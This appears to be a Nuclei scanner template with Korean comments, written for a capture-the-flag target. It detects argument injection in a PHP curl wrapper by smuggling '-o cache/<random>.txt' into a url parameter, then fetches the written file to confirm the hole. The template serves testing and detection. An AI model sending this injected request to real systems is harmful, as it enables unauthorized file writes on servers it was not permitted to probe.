id: php-curl-argument-injection-fixed

info:
  name: PHP Curl Argument Injection (Arbitrary File Write)
  author: jebeen
  severity: critical
  description: |
    Detects argument injection in PHP curl implementation.
    Writes a file to the '/cache/' directory to bypass root permission issues.
  tags: ctf, rce, injection, php, curl

http:
  - method: GET
    path:
      # [Step 1] 공격: 'cache' 디렉터리 안에 파일 생성 시도
      # 권한이 확실한 ./cache/ 경로를 명시적으로 지정
      - "{{BaseURL}}/?url=http://example.com%20-o%20cache/{{randstr}}.txt"

      # [Step 2] 검증: 생성된 파일 접근
      - "{{BaseURL}}/cache/{{randstr}}.txt"

    # 요청 간의 상태를 공유하기 위해 필수
    req-condition: true

    matchers:
      - type: dsl
        dsl:
          # 두 번째 요청(파일 접근)이 200 OK이고, 본문에 "Example Domain"이 포함되어야 함
          - "status_code_2 == 200 && contains(body_2, 'Example Domain')"